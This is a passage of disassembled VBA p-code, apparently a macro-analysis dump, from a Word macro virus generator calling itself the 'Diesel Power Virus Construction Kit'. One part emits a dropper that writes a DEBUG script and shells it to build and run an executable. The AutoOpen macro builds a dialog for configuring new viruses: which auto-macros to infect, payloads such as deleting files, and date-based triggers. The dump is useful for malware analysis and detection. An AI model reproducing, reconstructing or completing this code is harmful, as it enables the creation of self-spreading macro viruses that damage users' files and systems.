' 	ArgsMemCall Insert 0x0001 
' Line #271:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #272:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #273:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #274:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #275:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #276:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #277:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 11f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #278:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1200 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #279:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1210 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #280:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1220 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #281:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1230 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #282:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #283:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #284:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #285:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #286:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1280 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #287:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 1290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #288:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #289:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #290:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #291:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #292:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #293:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0037 "e 12f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #294:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "RCX"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #295:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0004 "1200"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #296:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "W"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #297:
' 	LineCont 0x0008 0A 00 00 00 0C 00 00 00
' 	LitStr 0x000A "print #1, "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "Q"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #298:
' 	LitStr 0x0008 "Close #1"
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #299:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "debug < c:\myscript.scr > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #300:
' 	LineCont 0x0004 0C 00 00 00
' 	LitStr 0x0006 "Shell "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0015 "c:\myscript.exe > nul"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld T$ 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall Insert 0x0001 
' Line #301:
' Line #302:
' 	EndSub 
' Line #303:
' Macros/VBA/AutoOpen - 20842 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn T
' Line #3:
' 	Dim 
' 	VarDefn CheckBox1
' Line #4:
' 	Dim 
' 	VarDefn CheckBox2
' Line #5:
' 	Dim 
' 	VarDefn CheckBox3
' Line #6:
' 	Dim 
' 	VarDefn CheckBox4
' Line #7:
' 	LineCont 0x0004 0F 00 00 00
' 	LitStr 0x0023 "Diesel Power Virus Construction Kit"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001D "       (c) by XaRaBaS [DkpRJ]"
' 	Add 
' 	LitStr 0x000A "DPVCK v1.0"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #8:
' 	LineCont 0x0004 09 00 00 00
' 	LitDI2 0x0208 
' 	LitDI2 0x012C 
' 	LitStr 0x0015 "Diesel Power v1.0 VCK"
' 	LitStr 0x0017 " (c) by XaRaBaS [DkpRJ]"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall BeginDialog 0x0003 
' Line #9:
' 	QuoteRem 0x0000 0x000A "----------"
' Line #10:
' 	LitDI2 0x000A 
' 	LitDI2 0x000A 
' 	LitDI2 0x012C 
' 	LitDI2 0x006E 
' 	LitStr 0x000E " Virus info : "
' 	Ld WordBasic 
' 	ArgsMemCall GroupBox 0x0005 
' Line #11:
' 	LitDI2 0x0014 
' 	LitDI2 0x001E 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "Author:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #12:
' 	LitDI2 0x0078 
' 	LitDI2 0x001E 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "Author$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #13:
' 	LitDI2 0x0014 
' 	LitDI2 0x0032 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x000B "Virus name:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #14:
' 	LitDI2 0x0078 
' 	LitDI2 0x0032 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "Name$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #15:
' 	LitDI2 0x0014 
' 	LitDI2 0x0046 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x000B "Identifier:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #16:
' 	LitDI2 0x0078 
' 	LitDI2 0x0046 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Ident$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #17:
' 	LitDI2 0x0014 
' 	LitDI2 0x005A 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x000C "Target file:"
' 	Ld WordBasic 
' 	ArgsMemCall Then 0x0005 
' Line #18:
' 	LitDI2 0x0078 
' 	LitDI2 0x005A 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "File$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #19:
' 	QuoteRem 0x0000 0x0009 "---------"
' Line #20:
' 	LitDI2 0x0140 
' 	LitDI2 0x000A 
' 	LitDI2 0x00BE 
' 	LitDI2 0x006E 
' 	LitStr 0x0013 " Infected macros : "
' 	Ld WordBasic 
' 	ArgsMemCall GroupBox 0x0005 
' Line #21:
' 	LitDI2 0x014A 
' 	LitDI2 0x001E 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "AutoNew"
' 	LitStr 0x0009 "CheckBox1"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #22:
' 	LitDI2 0x014A 
' 	LitDI2 0x0032 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0009 "AutoClose"
' 	LitStr 0x0009 "CheckBox2"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #23:
' 	LitDI2 0x014A 
' 	LitDI2 0x0046 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0008 "AutoExec"
' 	LitStr 0x0009 "CheckBox3"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #24:
' 	LitDI2 0x014A 
' 	LitDI2 0x005A 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x000A "FileSaveAs"
' 	LitStr 0x0009 "CheckBox4"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #25:
' 	QuoteRem 0x0000 0x0009 "---------"
' Line #26:
' 	LitDI2 0x000A 
' 	LitDI2 0x0082 
' 	LitDI2 0x012C 
' 	LitDI2 0x008C 
' 	LitStr 0x000B " Payload : "
' 	Ld WordBasic 
' 	ArgsMemCall GroupBox 0x0005 
' Line #27:
' 	LitStr 0x0008 "selector"
' 	Ld WordBasic 
' 	ArgsMemCall OptionGroup 0x0001 
' Line #28:
' 	LitDI2 0x0014 
' 	LitDI2 0x0096 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x000A "No payload"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #29:
' 	LitDI2 0x0014 
' 	LitDI2 0x00AA 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "Message"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #30:
' 	LitDI2 0x0014 
' 	LitDI2 0x00BE 
' 	LitDI2 0x0064 
' 	LitDI2 0x0011 
' 	LitStr 0x0009 "Kill file"
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #31:
' 	LineCont 0x0004 0D 00 02 00
' 	LitDI2 0x0014 
' 	LitDI2 0x00D2 
' 	LitDI2 0x0118 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Virus "
' 	LitStr 0x001E "FaT DeViL ViRuS by ThAnAtHoS  "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #32:
' 	LineCont 0x0004 0D 00 02 00
' 	LitDI2 0x0014 
' 	LitDI2 0x00E6 
' 	LitDI2 0x0118 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Virus "
' 	LitStr 0x0018 "TeX's GuNs ViRuS by TeX "
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #33:
' 	LineCont 0x0004 0D 00 02 00
' 	LitDI2 0x0014 
' 	LitDI2 0x00FA 
' 	LitDI2 0x0118 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Virus "
' 	LitStr 0x001E "LeNiN ViRuS by XaRaBaS [DkpRJ]"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall OptionButton 0x0005 
' Line #34:
' 	LitDI2 0x0078 
' 	LitDI2 0x00AA 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0008 "Message$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #35:
' 	LitDI2 0x0078 
' 	LitDI2 0x00BE 
' 	LitDI2 0x00B4 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "Kill$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #36:
' 	QuoteRem 0x0000 0x000A "----------"
' Line #37:
' 	LitDI2 0x0140 
' 	LitDI2 0x0082 
' 	LitDI2 0x00BE 
' 	LitDI2 0x008C 
' 	LitStr 0x0013 " Time of payload : "
' 	Ld WordBasic 
' 	ArgsMemCall GroupBox 0x0005 
' Line #38:
' 	LitDI2 0x014A 
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x0004 "Year"
' 	LitStr 0x0007 "TwoBox1"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #39:
' 	LitDI2 0x01CC 
' 	LitDI2 0x0096 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "Year$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #40:
' 	LitDI2 0x014A 
' 	LitDI2 0x00AA 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x000C "Month (1-12)"
' 	LitStr 0x0007 "TwoBox2"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #41:
' 	LitDI2 0x01CC 
' 	LitDI2 0x00AA 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0006 "Month$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #42:
' 	LitDI2 0x014A 
' 	LitDI2 0x00BE 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x000D "Weekday (1-7)"
' 	LitStr 0x0007 "TwoBox3"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #43:
' 	LitDI2 0x01CC 
' 	LitDI2 0x00BE 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0008 "Weekday$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #44:
' 	LitDI2 0x014A 
' 	LitDI2 0x00D2 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x000A "Day (1-31)"
' 	LitStr 0x0007 "TwoBox4"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #45:
' 	LitDI2 0x01CC 
' 	LitDI2 0x00D2 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0004 "Day$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #46:
' 	LitDI2 0x014A 
' 	LitDI2 0x00E6 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x000B "Hour (0-23)"
' 	LitStr 0x0007 "TwoBox5"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #47:
' 	LitDI2 0x01CC 
' 	LitDI2 0x00E6 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0005 "Hour$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #48:
' 	LitDI2 0x014A 
' 	LitDI2 0x00FA 
' 	LitDI2 0x0096 
' 	LitDI2 0x0011 
' 	LitStr 0x000D "Second (0-59)"
' 	LitStr 0x0007 "TwoBox6"
' 	Ld WordBasic 
' 	ArgsMemCall CheckBox 0x0006 
' Line #49:
' 	LitDI2 0x01CC 
' 	LitDI2 0x00FA 
' 	LitDI2 0x001E 
' 	LitDI2 0x0011 
' 	LitStr 0x0007 "Second$"
' 	Ld WordBasic 
' 	ArgsMemCall TextBox 0x0005 
' Line #50:
' 	QuoteRem 0x0000 0x000A "----------"
' Line #51:
' 	LitDI2 0x0064 
' 	LitDI2 0x0113 
' 	LitDI2 0x005A 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall OKButton 0x0004 
' Line #52:
' 	LitDI2 0x0140 
' 	LitDI2 0x0113 
' 	LitDI2 0x005A 
' 	LitDI2 0x0014 
' 	Ld WordBasic 
' 	ArgsMemCall CancelButton 0x0004 
' Line #53:
' 	Ld WordBasic 
' 	ArgsMemCall EndDialog 0x0000 
' Line #54:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	MemLd UserDialog 
' 	Set dlg 
' Line #55:
' 	LitStr 0x000F "XaRaBaS [DkpRJ]"
' 	Ld dlg 
' 	MemSt Author$ 
' Line #56:
' 	LitStr 0x000E "ThE ReAl PoWeR"
' 	Ld dlg 
' 	MemSt New$ 
' Line #57:
' 	LitStr 0x0005 "DkpRJ"
' 	Ld dlg 
' 	MemSt Ident$ 
' Line #58:
' 	LitStr 0x000A "c:\oil.bas"
' 	Ld dlg 
' 	MemSt File$ 
' Line #59:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Clo 
' Line #60:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall UserDialog 0x0001 
' Line #61:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St T$ 
' Line #62:
' 	QuoteRem 0x0000 0x002E "----- ???????? ????????? ???????? ??? ???? !!!"
' Line #63:
' 	Ld dlg 
' 	MemLd TwoBox2 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #64:
' 	Ld dlg 
' 	MemLd Month$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	Ld dlg 
' 	MemLd Month$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x000C 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #65:
' 	GoTo ErrNumber 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld dlg 
' 	MemLd TwoBox3 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #69:
' 	Ld dlg 
' 	MemLd WeekDay$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Lt 
' 	Paren 
' 	Ld dlg 
' 	MemLd WeekDay$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0007 
' 	Gt 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #70:
' 	GoTo ErrNumber 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Ld dlg 
' 	MemLd TwoBox4 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #74:
